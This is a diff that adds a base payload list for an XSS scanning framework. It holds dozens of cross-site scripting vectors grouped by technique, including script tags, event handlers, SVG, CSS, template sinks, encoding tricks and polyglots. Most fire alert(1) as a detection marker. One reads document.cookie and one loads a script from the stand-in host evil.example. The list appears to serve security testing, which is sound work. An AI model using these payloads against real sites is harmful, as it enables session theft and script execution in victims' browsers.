@@ -1,0 +1,75 @@
+# XSS Framework — Base Payload Set
+# Format: one payload per line; lines starting with # are comments
+# Marker substitution replaces the first occurrence of "1" with a random
+# detection string at scan time.
+
+# ── Script injection ──────────────────────────────────────────────────────────
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script src=//evil.example/x.js></script>
+<script>window['alert'](1)</script>
+<script>eval('alert\x281\x29')</script>
+
+# ── Attribute event handlers ──────────────────────────────────────────────────
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1) />
+<img src="x" onerror="alert(1)">
+<img/src=x onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<button onclick=alert(1)>X</button>
+<a href="javascript:alert(1)">click</a>
+<a href=javascript:alert(1)>click</a>
+<body onload=alert(1)>
+<body/onload=alert(1)>
+<body onpageshow=alert(1)>
+<details open ontoggle=alert(1)>
+<video autoplay onplay=alert(1)><source></video>
+<audio autoplay onplay=alert(1)><source></audio>
+<marquee onstart=alert(1)>X</marquee>
+
+# ── SVG vectors ───────────────────────────────────────────────────────────────
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg><desc><script>alert(1)</script></desc></svg>
+
+# ── HTML5 / newer elements ────────────────────────────────────────────────────
+<details open><summary>X</summary><img src=x onerror=alert(1)></details>
+<form><button formaction=javascript:alert(1)>X</button></form>
+<math><mtext></mtext><mglyph><svg><text><tspan><![CDATA[</tspan><script>alert(1)</script>]]></text></svg></mglyph></math>
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe src=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+# ── Style / CSS execution ─────────────────────────────────────────────────────
+<style>*{background-image:url("javascript:alert(1)")}</style>
+<link rel=stylesheet href=javascript:alert(1)>
+<div style="background-image:url(javascript:alert(1))">X</div>
+
+# ── Meta / redirect ───────────────────────────────────────────────────────────
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+
+# ── Template / framework sinks (Angular, Vue, React) ─────────────────────────
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+
+# ── Null-byte and whitespace tricks ──────────────────────────────────────────
+<scr%00ipt>alert(1)</scr%00ipt>
+<img src=x	onerror=alert(1)>
+<img src=x
+onerror=alert(1)>
+
+# ── Double-encoded ────────────────────────────────────────────────────────────
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+
+# ── Polyglots ─────────────────────────────────────────────────────────────────
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
